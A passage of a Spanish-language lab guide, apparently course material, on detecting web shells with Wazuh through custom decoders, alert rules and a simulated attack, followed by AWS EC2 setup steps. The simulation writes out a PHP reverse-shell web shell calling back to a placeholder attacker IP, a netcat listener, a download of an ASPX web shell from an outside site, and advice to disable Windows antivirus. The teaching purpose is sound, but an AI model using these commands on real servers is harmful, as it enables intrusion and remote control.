+<p>Añadir, en el archivo de configuración <code>/var/ossec/etc/decoders/local_decoder.xml</code> los siguientes decodificadores para decodificar patrones de conexiones de red establecidas por web shells en los servidores web:</p>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Decodificar para las conexiones de red de web shells --&gt;</span>
+<span class="nt">&lt;decoder</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;network-traffic-child&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;parent&gt;</span>ossec<span class="nt">&lt;/parent&gt;</span>
+<span class="w">  </span><span class="nt">&lt;prematch</span><span class="w"> </span><span class="na">offset=</span><span class="s">&quot;after_parent&quot;</span><span class="nt">&gt;</span>^output:<span class="w"> </span>&#39;webshell<span class="w"> </span>connections&#39;:<span class="nt">&lt;/prematch&gt;</span>
+<span class="w">  </span><span class="nt">&lt;regex</span><span class="w"> </span><span class="na">offset=</span><span class="s">&quot;after_prematch&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(\d+.\d+.\d+.\d+):(\d+)\|(\d+.\d+.\d+.\d+):(\d+)<span class="nt">&lt;/regex&gt;</span>
+<span class="w">  </span><span class="nt">&lt;order&gt;</span>local_ip,<span class="w"> </span>local_port,<span class="w"> </span>foreign_ip,<span class="w"> </span>foreign_port<span class="nt">&lt;/order&gt;</span>
+<span class="nt">&lt;/decoder&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Añadir al archivo de configuración <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intentna detectar conexiones de red establecidas por web shells en los servidores web:</p>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Regla detectar conexiones red web shells --&gt;</span>
+<span class="nt">&lt;group</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;linux, webshell,&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100510&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;decoded_as&gt;</span>ossec<span class="nt">&lt;/decoded_as&gt;</span>
+<span class="w">    </span><span class="nt">&lt;match&gt;</span>ossec:<span class="w"> </span>output:<span class="w"> </span>&#39;webshell<span class="w"> </span>connections&#39;<span class="nt">&lt;/match&gt;</span>
+<span class="w">    </span><span class="nt">&lt;description&gt;</span>[Network<span class="w"> </span>connection]:<span class="w"> </span>Script<span class="w"> </span>attempting<span class="w"> </span>network<span class="w"> </span>connection<span class="w"> </span>on<span class="w"> </span>source<span class="w"> </span>port:<span class="w"> </span>$(local_port)<span class="w"> </span>and<span class="w"> </span>destination<span class="w"> </span>port:<span class="w"> </span>$(foreign_port)<span class="nt">&lt;/description&gt;</span>
+<span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
+<span class="w">      </span><span class="nt">&lt;id&gt;</span>TA0011<span class="nt">&lt;/id&gt;</span>
+<span class="w">      </span><span class="nt">&lt;id&gt;</span>T1049<span class="nt">&lt;/id&gt;</span>
+<span class="w">      </span><span class="nt">&lt;id&gt;</span>T1505.003<span class="nt">&lt;/id&gt;</span>
+<span class="w">   </span><span class="nt">&lt;/mitre&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/rule&gt;</span>
+<span class="nt">&lt;/group&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuración:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>wazuh-manager
+</code></pre></div>
+</li>
+</ol>
+<h2 id="simulacion-de-ataque">Simulación de ataque</h2>
+<p>A continuación se detallan los pasos para simular como funcionan las web shells en los endpoints comprometidos.</p>
+<h3 id="pasos-para-simular-el-ataque-contra-el-endpoint-ubuntu">Pasos para simular el ataque contra el endpoint Ubuntu</h3>
+<h4 id="ubuntu_2">Ubuntu</h4>
+<p>Ejecutar los siguientes pasos con privilegio de <em>root</em>.</p>
+<ol>
+<li>
+<p>Crear un archivo, por ejemplo <code>webshell.php</code> en el directorio del servidor web <code>/var/www/html</code> con la siguiente línea de código que ejecutará una shell inversa:</p>
+<div class="highlight"><pre><span></span><code><span class="x">echo -e &quot;</span><span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/&lt;IP_DEBIAN&gt;/4444 0&gt;&amp;1\&quot;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x">&quot; &gt; /var/www/html/webshell.php</span>
+</code></pre></div>
+</li>
+</ol>
+<h4 id="debian">Debian</h4>
+<ol>
+<li>
+<p>En el terminal de nuestra Debian utilizaremos netcat (nc, instaladlo si no lo está) para escuchar conexiones en el puerto <strong>4444</strong>:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+</li>
+<li>
+<p>Ejecutar la web shell desde nuestro navegador accediendo a la URL <code>http://&lt;IP_UBUNTU&gt;/webshell.php</code>, de tal forma que se establezca una shell inversa con el endpoint Ubuntu hacia nuestra Debian atacante.</p>
+</li>
+<li>
+<p>En el terminal que nos aparecerá en el netcat de nuestra Debian, ejecutar varios comandos tales como <code>id</code>, <code>cat /etc/passwd</code>, <code>whoami</code>...</p>
+</li>
+</ol>
+<h4 id="ver-las-alertas">Ver las alertas</h4>
+<p>En el dashboard de Wazuh, navegar a <strong><em>Security events</em></strong> y visualizar las alertas generadas:</p>
+<h3 id="pasos-para-simular-el-ataque-contra-el-endpoint-windows">Pasos para simular el ataque contra el endpoint Windows</h3>
+<h4 id="windows_1">Windows</h4>
+<div class="admonition warning">
+<p class="admonition-title">Atención</p>
+<p>Es más que probable que necesitéis desactivar el antivirus y la detección de amenazas de Windows para que os funcione esta parte.</p>
+</div>
+<p>Ejecutar los siguientes pasos en una terminal de PowerShell ejecutándose como administrador:</p>
+<ol>
+<li>
+<p>Descargar una copia de una web shell en el directorio del servidor web <code>C:\inetput\wwwroot</code> y llamarla, por ejemplo, <code>webshell.aspx</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&gt;</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-OutFile</span> <span class="s1">&#39;C:\Users\Public\Downloads\webshell.aspx&#39;</span> <span class="n">-Uri</span> <span class="n">https</span><span class="p">://</span><span class="n">privdayz</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">cdn</span><span class="p">/</span><span class="n">txt</span><span class="p">/</span><span class="n">aspx</span><span class="p">.</span><span class="n">txt</span>
+<span class="p">&gt;</span> <span class="nb">copy </span><span class="s1">&#39;C:\Users\Public\Downloads\webshell.aspx&#39;</span> <span class="s1">&#39;C:\inetpub\wwwroot\webshell.aspx&#39;</span>
+</code></pre></div>
+</li>
+</ol>
+<h4 id="debian_1">Debian</h4>
+<ol>
+<li>
+<p>En el terminal de nuestra Debian escuchamos conexiones en el puerto <strong>4444</strong>:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+</li>
+<li>
+<p>Acceder a la web shell desde nuestro navegador mediante la URL <code>http://&lt;IP_WINDOWS&gt;/webshell.aspx</code>.</p>
+<p>La contraseña de la web shell es <strong>admin</strong>. En el menú <em>CmdShell</em>, ejecuta comandos tales como <code>whoami</code>, <code>ipconfig</code>...</p>
+</li>
+<li>
+<p>En el menú <em>PortMap</em>, introducir la IP de nuestra Debian como <strong>Remote IP</strong>, <code>4444</code> como <strong>Remote Port</strong> y <code>5555</code> como <strong>Local Port</strong>. Tras ello, pulsar <strong>MapPort</strong></p>
+</li>
+</ol>
+<h4 id="ver-las-alertas_1">Ver las alertas</h4>
+<p>En el dashboard de Wazuh, navegar a <strong><em>Security events</em></strong> y visualizar las alertas generadas:</p>
+<h2 id="recapitulacion-y-conclusiones">Recapitulación y conclusiones</h2>
+<ul>
+<li>
+<p>Las web shells de cualquier tipo suelen tener comportamientos similares, esto es, crean o modifican archivos presentes en los directorios de los servidores web, realizando conexiones de red para establecer shells inversas y ejecutando comandos para tareas post-explotación.</p>
+</li>
+<li>
+<p>Con Wazuh podemos ser capaces de detectar estas web shells, usando FIM y la monitorización de comandos</p>
+</li>
+<li>
+<p>También hemos realizado la integración de <em>auditd</em> y <em>Sysmon</em> con Wazuh, aportando así más información a los logs, siendo capaces de realizar una mejor detección en los endpoints comprometidos</p>
+</li>
+<li>
+<p>No obstante, es recomendable que las organizaciones además tengan en marcha defensas contra las tareas de post-explotación como puedan ser el escaneo y parcheo de sistemas y aplicaciones vulnerables, así como políticas de seguridad que monitoricen malas configuraciones de los sistemas.</p>
+</li>
+</ul>
+<h2 id="anexo-despliegue-de-instancias-ec2-linux-y-windows-en-aws">Anexo: despliegue de instancias EC2 Linux y Windows en AWS</h2>
+<p>Una vez tenemos creados nuestro laboratorio (<em>Learner Lab</em>)en AWS Academy, podremos hacer uso de varios servicios de Amazon Web Services, dentro de unos límites, aunque estos límites no nos afectan para nuestro propósito.</p>
+<p>Amazon ofrece una cantidad ingente de servicios que podéis consultar en los capítulos 1, 3 y 9 del curso de AWS Foundations. Uno de estos servicios es el de computación, es decir, la creación de instancias EC2 (Elastic Compute Cloud). Esto no es más que la creación de máquinas virtuales en la nube, lo cual nos es de extrema utilidad para el caso que nos ocupa.</p>
+<p>A continuación se mostrará detalladamente el proceso de creación de instancias Linux y Windows, así como la forma de conectarse a dichas instancias.</p>
+<h3 id="ec2-linux">EC2 Linux</h3>
+<p>En primer lugar debéis entrar en vuestro Learner Lab y acceder a los contenidos:</p>
+<p><img alt="" src="../img/aws1.png" /></p>
+<p>E ir a la pantalla de lanzamiento del laboratorio:</p>
+<p><img alt="" src="../img/aws2.png" /></p>
+<p>Le daremos a iniciar laboratorio y esperaremos a que el icono marcado se ponga en verde. Una vez lo esté, haremos click en él para que nos lleve a la página de administración de servicios de AWS:</p>
+<p><img alt="" src="../img/aws3.png" /></p>
+<p>Una vez en esta página, el servicio que a nosotros nos interesa en este momento son las instancias EC2. Así pues, escribimos esto en la caja de búsqueda:</p>
+<p><img alt="" src="../img/aws4.png" /></p>
+<p>Le decimos que queremos lanzar una nueva instancia:</p>
+<p><img alt="" src="../img/aws5.png" /></p>
+<p>E iremos completando los detalles necesarios, como nombre o imagen de la máquina que se creará (Amazon Linux, Ubuntu, Debian, Windows...). En esta caso se ilustra el ejemplo de la máquina cliente Ubuntu pero habría que seleccionar según el caso:</p>
+<p><img alt="" src="../img/aws6.png" /></p>
+<p>Podemos elegir distintos tipos de instancias, con distintos precios por uso, así como propiedades (CPU+RAM). <strong>Para el caso de las instancias Linux, nos basta una <em>t2.micro</em>. Para el caso de las Windows, debemos elegir t2.medium para no quedarnos demasiado cortos.</strong></p>
+<p><img alt="" src="../img/aws7.png" /></p>
+<p>En el apartado de <em>Claves de sesión</em>, elegiremos <strong>vockey</strong>. Esto nos permitirá más tarde conectarnos a las instancias:</p>
+<p><img alt="" src="../img/aws8.png" /></p>
+<p>En configuraciones de red lo único que debemos hacer es dejar marcada la opción por defecto <strong><em>Crear grupo de seguridad</em></strong> y marcarle que permita tanto el tráfico SSH desde cualquier lugar, como el tráfico HTTP desde Internet.</p>
+<p>Los grupos de seguridad son, de forma aproximada, una especie de Firewall que filtra las conexiones desde y hacia nuestras instancias.</p>
+<div class="admonition warning">
+<p class="admonition-title">¡Atención!</p>
+<p>Los clientes Linux y Windows que contendrán sendos agentes, alojan su contenido mediante servidores web en el puerto (80), HTTP. Sin embargo, el servidor de Wazuh o Wazuh manager, utiliza sólo HTTPS con certificado autofirmado para su interfaz web. </p>
+<p>Tened esto en cuenta a la hora de crear la instancia y marcad la casilla correspondiente. </p>
+<p>Si os despistáis, más adelante se explica cómo modificar grupos de seguridad.</p>
+</div>
+<p>Tras lanzar la instancia, se encontrará en estado <em>Iniciando</em> y después pasará a <em>En ejecución</em>.</p>
+<h3 id="ec2-windows">EC2 Windows</h3>
+<p>Lanzamos otra vez una nueva instancia, indicando el nombre que queramos y diciéndole que se tratará de un Windows:</p>
+<p><img alt="" src="../img/aws9.png" /></p>
+<p>Puesto que carecemos de la opción de un Windows 10/11, utilizaremos entonces un Windows Server como cliente.</p>
+<p>Como se indicó anteriormente, ha de ser <em>t2.medium</em>: </p>
+<p><img alt="" src="../img/aws10.png" /></p>
+<p>De nuevo, indicamos las claves <em>vockey</em> y permitimos tanto tráfico SSH, como HTTP:</p>
+<p><img alt="" src="../img/aws11.png" /></p>
+<p>Tras lanzar la instancia, se encontrará en estado <em>Iniciando</em> y después pasará a <em>En ejecución</em>.</p>
+<h3 id="cuestiones-genericas">Cuestiones genéricas</h3>
+<h4 id="mas-reglas-en-los-grupos-de-seguridad">Más reglas en los grupos de seguridad</h4>
+<p>Para el servidor de Wazuh y para la máquina atacante, vamos a modificar sus grupos de seguridad para que puedan comunicarse con cualquier máquina de la red sin problemas.</p>
+<p>Marcamos la instancia que queramos modificar y seleccionamos la pestaña <em>Seguridad</em>:</p>
+<p><img alt="" src="../img/aws12.png" /></p>
+<p>Localizamos el grupo de seguridad y haremos click sobre él:</p>
+<p><img alt="" src="../img/aws13.png" /></p>
+<p>Una vez dentro del grupo, editamos las reglas <strong>de entrada</strong>:</p>
+<p><img alt="" src="../img/aws14.png" /></p>
+<p>Las instancias se crean por defecto en la red <code>172.31.0.0/16</code>. Permitiremos entonces todo el tráfico de entrada proveniente de dicha red, añadiendo una regla a tal efecto:</p>
+<p><img alt="" src="../img/aws15.png" /></p>
+<h4 id="conexion-remota-a-las-maquinas">Conexión remota a las máquinas</h4>
+<h5 id="linux">Linux</h5>
+<p>Accedemos a la pantalla primigénia desde donde lanzamos nuestro laboratorio y en la sección de <em>AWS Details</em> tendremos la posibilidad de descargarnos unas claves para la conexión que queremos llevar a cabo. Así pues, las descargamos, tal y como indica el paso 2:</p>
+<p><img alt="" src="../img/aws16.png" /></p>
+<p>Es importante darle los permisos adecuados a la clave privada recién descargada, de otra forma no nos permitirá conectarnos. Una vez hecho, basta con realizar una conexión normal por SSH pero indicando con el parámetro <code>-i</code>que utilizaremos el archivo de claves que nos desacargamos en el paso anterior:</p>
+<p><img alt="" src="../img/aws17.png" /></p>
+<p>La IP <strong>pública</strong> de cada instancia al a que queramos conectarnos podemos consultarla así:</p>
+<p><img alt="" src="../img/aws18.png" /></p>
+<p>Y de esta forma ya podemos realizar cualquier acción que necesitásemos llevar a cabo, tal y como si se tratase de una máquina virtual en nuestra máquina.</p>
+<h5 id="windows_2">Windows</h5>
+<p>Para el caso de Windows, en lugar de conectarnos usando SSH, lo haremos mediante escritorio remoto (RDP). Para ello el proceso es un poco distinto, veámoslo.</p>
+<p>Igual que para el caso de Linux, necesitaremos la clave privada que nos podemos descargar. No obstante, la conexión se realizará utilizando algún cliente RDP. Si utilizáis Windows para conectaros, el cliente lo tendréis nativo. Si por otra parte utilizáis Linux, necesitaréis alguna aplicación tipo Remmina o similar.</p>
+<p>El primer paso será seleccionar nuestra instancia Windows y darle a <em>Conectar</em>:</p>
+<p><img alt="" src="../img/aws19.png" /></p>
+<p>En esta sección le diremos que nos vamos a conectar mediante un cliente RDP:</p>
+<p><img alt="" src="../img/aws20.png" /></p>
+<p>Nos descargaremos el archivo <em>.rdp</em> que utilizaremos para conectarnos y, tras ello, le daremos a <em>Obtener contraseña</em> para obtener las credenciales a utilizar:</p>
+<p><img alt="" src="../img/aws21.png" /></p>
+<p>Para poder obtener nuestra contraseña debemos hacer uso del archivo de clave privada que nos descargamos en seccines anteriores (es el mismo para todas las instancias).</p>
+<p>Lo cargaremos y, una vez hecho, le daremos a descifrar contraseña:</p>
+<p><img alt="" src="../img/aws22.png" /></p>
+<p>Una vez obtenida la contraseña no queda más que utilizar el cliente RDP elegido (en mi caso Remmina) para abrir el archivo <em>.rdp</em> y conectarnos utilizando la contraseña obtenida:</p>
+<p><img alt="" src="../img/aws23.png" /></p>
+<p><img alt="" src="../img/aws24.png" /></p>
+<p><img alt="" src="../img/aws25.png" /></p>
+<p><img alt="" src="../img/aws26.png" /></p>
+<p><img alt="" src="../img/aws27.png" /></p>
+<div class="admonition warning">
+<p class="admonition-title">¡Atención!</p>
+<p>El laboratorio se apaga automáticamente a las 4 horas, tiempo más que suficiente para llevar a cabo la práctica. En caso contrario, podréis reiniciarlo puesto que sólo se apagan las instancias pero no se pierde el trabajo.</p>
+<p>Si trabajáis en varias tandas o acabáis antes de las 4 horas, apagadlo vosotros para evitar gastos innecearios en vuestro crédito de 100$. Para ello, en la página de lanzamiento del laboratorio, esta vez le daremos a <strong><em>End lab</em></strong></p>
+</div>
+<h2 id="despliegue-automatizado-del-escenario">Despliegue automatizado del escenario</h2>
+<p>Para desplegar este escenario de forma automatizada en AWS se puede hacer uso del siguiente repositorio: </p>
+<p><a href="https://github.com/raul-profesor/wazuh-webshells-terraform.git">https://github.com/raul-profesor/wazuh-webshells-terraform.git</a></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "toc.integrate", "navigation.expand", "navigation.top", "navigation.indexes", "content.tabs.link", "content.code.annotate", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
